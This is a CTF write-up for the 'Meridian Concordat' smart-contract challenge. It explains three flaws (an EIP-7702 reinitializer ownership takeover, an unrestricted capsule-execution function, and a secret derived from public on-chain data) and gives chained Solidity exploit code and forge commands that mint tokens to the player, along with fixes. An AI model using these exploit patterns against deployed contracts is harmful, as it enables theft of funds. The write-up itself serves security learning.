# Meridian Concordat — Walkthrough

## Goal
Get `balanceOf(PLAYER) >= 1,150,000 MRC` tokens to solve the challenge.

---

## The Setup

7 reserve stations (EOAs using **EIP-7702** to delegate to implementation contracts) control a unified currency called **Meridian Credits (MRC)**. Each station has a one-time mint cap:

| Station | Delegation | Mint Cap |
|---------|-----------|----------|
| BOREAS | AccountRecovery V2 | 500,000 |
| HELIX | SafeSmartWallet | 500,000 |
| VORTAN | SharedEscrow | 200,000 |
| DRIFT | BatchExecutor | 0 |
| THALIAN | SharedEscrow | 200,000 |
| KAEL | GovernanceModule | 300,000 |
| AXIOM | SovereignAI | 300,000 |

Key MRC rules:
- Only authorized stations can call `mint(to, amount)`
- Each station can only mint **once** (`hasMinted` flag)
- Transfers restricted to authorized stations — **but minting bypasses this** (from == address(0) skips the check), so stations can mint directly to PLAYER

---

## Step 1 — Recon

### Identify EIP-7702 delegations

```bash
cast code $BOREAS --rpc-url $RPC
# → 0xef0100476c68... → AccountRecovery V2
```

Each station's code starts with `0xef0100` + the implementation address. Mapped all 7 stations this way.

### Check initialization state

```bash
# BOREAS — OZ Initializable storage slot
cast storage $BOREAS 0xf0c57e16840df040f15088dc2f81fe391c3923bec73e23a9662efc9c229c6a00 --rpc-url $RPC
# → 0x01 (version 1)
```

BOREAS was initialized at version 1 (by AccountRecovery V1), but now delegates to V2 which uses `reinitializer(2)`.

### Check HELIX capsules

```bash
cast call $CANNON_GUARD 'getCapsules(address)(address[])' $HELIX --rpc-url $RPC
# → [0x47A849889029A91b005779C95D237b0b0d667791]

cast call $CAPSULE 'target()(address)' --rpc-url $RPC   # → MRC address
cast call $CAPSULE 'selector()(bytes4)' --rpc-url $RPC  # → 0x40c10f19 (mint)
cast call $CAPSULE 'consumed()(bool)' --rpc-url $RPC    # → false
```

Pre-approved capsule for `MRC.mint()` exists and is unconsumed.

### Check AXIOM treaty

```bash
cast call $AXIOM 'treatyAllocation()(uint256)' --rpc-url $RPC  # → 150,000e18
cast call $AXIOM 'independent()(bool)' --rpc-url $RPC          # → true
```

Manifesto is on-chain, cooperation seed is computable.

---

## Step 2 — Vulnerabilities

### Vulnerability 1: AccountRecovery V1 → V2 Re-initialization

**File:** `AccountRecovery.sol:41` — `reinitializer(2)`
**File:** `AccountRecoveryV1.sol:40` — `initializer` (version 1)

**What happened:** BOREAS was originally set up with AccountRecovery V1, which uses OpenZeppelin's `initializer` modifier (sets version to 1). Later, its EIP-7702 delegation was changed to AccountRecovery V2, which uses `reinitializer(2)`. Since the stored version (1) is less than the required version (2), **anyone can call `initialize()` again** and become the new owner.

**Why it's dangerous:** When upgrading proxy-pattern or EIP-7702 delegated contracts, the `reinitializer(N)` allows re-initialization if the previous version was lower. This is by design for legitimate upgrades, but without access control on `initialize()`, it becomes an ownership takeover.

**Fix:** Add access control to `initialize()` or use a separate migration function callable only by the current owner.

### Vulnerability 2: Unrestricted Capsule Execution

**File:** `SafeSmartWallet.sol:63-88` — `executeApprovedCapsule()`

**What happened:** `executeApprovedCapsule()` has **no access control** — anyone can call it. The function validates the capsule through CannonGuard, reads the target and selector from the capsule, then executes the call as the wallet. The capsule for HELIX authorizes `MRC.mint()` with any parameters.

**Why it's dangerous:** The capsule system was designed for pre-approved transactions, but `executeApprovedCapsule` should have been `onlyOwner` or at least restricted. Since anyone can trigger it, the pre-approved `mint` capsule lets any caller mint HELIX's full 500k cap to any address.

**Fix:** Add `onlyOwner` modifier to `executeApprovedCapsule()`, or validate that the caller is authorized.

### Vulnerability 3: On-chain Cooperation Proof

**File:** `SovereignAI.sol:66,97-105`

**What happened:** The `_cooperationSeed` is `keccak256(abi.encodePacked(manifesto))`, and the manifesto is stored as a public string on-chain. The proof is `keccak256(abi.encodePacked(msg.sender, _cooperationSeed))`. Since the manifesto is readable, anyone can compute the seed and then the proof.

**Why it's dangerous:** The "prove understanding" mechanism is meant to be a challenge, but storing the secret on-chain makes it trivially solvable. The seed is derived from public data.

**Fix:** Use an off-chain commitment scheme or require a signature from a trusted party.

---

## Step 3 — The Attack (single transaction)

All 3 exploits chained in one `exploit()` call:

```
1. BOREAS reinit → become owner         (AccountRecovery V2 reinitializer)
2. AXIOM cooperation → transfer 150k    (on-chain manifesto → compute proof → claimTreatyAllocation to BOREAS)
3. BOREAS mint 650k to PLAYER           (500k original + 150k from AXIOM treaty)
4. HELIX capsule → mint 500k to PLAYER  (executeApprovedCapsule with no access control)

Total: 650,000 + 500,000 = 1,150,000 MRC ✓
```

### Attack contract key logic:

```solidity
// 1. Take over BOREAS
IAccountRecoveryV2(BOREAS).initialize(address(this), noGuardians);

// 2. AXIOM cooperation
ISovereignAI(AXIOM).initiateCooperation();
string memory manifesto = ISovereignAI(AXIOM).manifesto();
bytes32 seed = keccak256(abi.encodePacked(manifesto));
bytes32 proof = keccak256(abi.encodePacked(address(this), seed));
ISovereignAI(AXIOM).proveUnderstanding(proof);
ISovereignAI(AXIOM).claimTreatyAllocation(BOREAS, 150_000e18);

// 3. Mint from BOREAS (now 650k cap)
IAccountRecoveryV2(BOREAS).execute(MRC, abi.encodeWithSelector(
    IMeridianCredits.mint.selector, PLAYER, 650_000e18
));

// 4. Mint from HELIX via capsule
ISafeSmartWallet(HELIX).executeApprovedCapsule(
    CAPSULE, abi.encode(PLAYER, 500_000e18)
);
```

---

## Step 4 — Test

```bash
source .env
forge test -vvvv --fork-url $CTF_RPC_URL --match-path test/MeridianConcordat.t.sol
```

Result: **PASSED** — Player balance = 1,150,000 MRC, `isSolved() = true`.

## Step 5 — Deploy

```bash
source .env
forge script script/MeridianConcordat.s.sol --rpc-url $CTF_RPC_URL --broadcast --private-key $PRIVATE_KEY -vvvv
```

## Step 6 — Verify

```bash
cast call $CHALLENGE_ADDRESS 'isSolved()(bool)' --rpc-url $CTF_RPC_URL
# → true
```

---

## Key Takeaways

1. **EIP-7702 + OZ Initializable is dangerous** — When switching delegation targets, the `reinitializer(N)` pattern allows re-initialization if version increases. Always add access control to `initialize()`.
2. **On-chain secrets aren't secrets** — Any data stored on-chain (even in private variables) is readable. Never use on-chain data as a security mechanism.
3. **Pre-approved operations need caller restrictions** — If a function executes pre-approved actions, it still needs access control on who can trigger the execution.
4. **One-shot minting doesn't limit total damage** — Even though each station can only mint once, by transferring mint caps between stations first, an attacker can consolidate and mint the full amount in fewer transactions.
